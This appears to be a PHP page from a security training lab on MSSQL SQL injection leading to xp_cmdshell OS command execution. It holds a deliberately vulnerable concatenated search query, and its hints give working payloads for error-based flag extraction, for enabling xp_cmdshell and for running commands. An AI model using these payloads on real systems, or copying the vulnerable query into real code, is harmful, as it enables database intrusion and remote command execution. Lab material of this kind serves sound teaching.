<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    if ($conn) {
        // Live mode: verify against DB
        try {
            $stmt = $conn->query("SELECT TOP 1 flag FROM flags");
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row && $submitted === $row['flag']) {
                $_SESSION['mssql_lab7_solved'] = true;
                header("Location: " . url_lab_from_slug("mssql/lab7", $mode, $_GET['ref'] ?? ''));
                exit;
            } else {
                $verify_error = "Incorrect. Keep trying!";
            }
        } catch (PDOException $e) {
            $verify_error = "Database error. Is the MSSQL container running?";
        }
    } else {
        $verify_error = "Database connection failed. Is the MSSQL container running?";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 7. xp_cmdshell: OS Command Execution</h3>

    <h4>Scenario</h4>
    <p>
        A search feature on a corporate intranet is vulnerable to SQL injection.
        The application connects to MSSQL with <strong>sysadmin</strong> privileges.
        Error messages are displayed.
    </p>
    <p>
        MSSQL's <code>xp_cmdshell</code> extended stored procedure allows OS command
        execution directly from SQL. If the database user has <strong>sysadmin</strong>
        role, they can enable and use <code>xp_cmdshell</code> to run arbitrary commands.
    </p>
    <p>
        <em>Note: This lab runs on MSSQL for Linux, which does not support <code>xp_cmdshell</code>.
        You can verify sysadmin privileges and practice the attack chain conceptually.
        On Windows MSSQL, this technique provides full OS-level RCE.</em>
    </p>

    <h4>Objective</h4>
    <p>
        The flag is stored in the <code>flags</code> table. Use <strong>CONVERT error-based
        extraction</strong> to retrieve it. Verify you have sysadmin privileges, then study
        the <code>xp_cmdshell</code> attack chain (conceptual on Linux MSSQL).
        Submit the flag below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Extract the flag: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -</code><br>
        2. Enable xp_cmdshell: <code>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; -- -</code><br>
        3. Then: <code>'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -</code><br>
        4. Execute: <code>'; EXEC xp_cmdshell 'whoami'; -- -</code><br>
        5. Read output via temp table: <code>'; CREATE TABLE #cmd (output VARCHAR(8000)); INSERT INTO #cmd EXEC xp_cmdshell 'whoami'; -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mssql_lab7_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully extracted the flag and demonstrated xp_cmdshell OS command execution on MSSQL.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Intranet Search</h4>
    <form method="POST" class="form-row">
<input type="text" name="q" class="input" placeholder="Search (try: reports)" value="<?= htmlspecialchars($_POST['q'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['q'])) {
    $q = $_POST['q'];

    // INTENTIONALLY VULNERABLE: direct string concatenation, sysadmin context
    $query = "SELECT id, title, description FROM documents WHERE title LIKE '%$q%'";

    // Show the executed query in a terminal block
    echo '<div class="terminal query-output">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MSSQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">1&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    if ($conn) {
        try {
            $stmt = $conn->query($query);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (empty($rows)) {
                echo '<div class="result-warning result-box">No documents found.</div>';
            } else {
                foreach ($rows as $row) {
                    echo '<div class="result-data result-box">';
                    echo '<strong>' . htmlspecialchars($row['title'] ?? '') . '</strong><br>';
                    echo htmlspecialchars($row['description'] ?? '');
                    echo '</div>';
                }
            }
        } catch (PDOException $e) {
            echo '<div class="result-error result-box">';
            echo '<strong>MSSQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
            echo '</div>';
        }
    } else {
        echo '<div class="result-error result-box">';
        echo '<strong>Error:</strong> Database connection failed. Is the MSSQL container running?';
        echo '</div>';
    }
}
?>

<?php endif; ?>
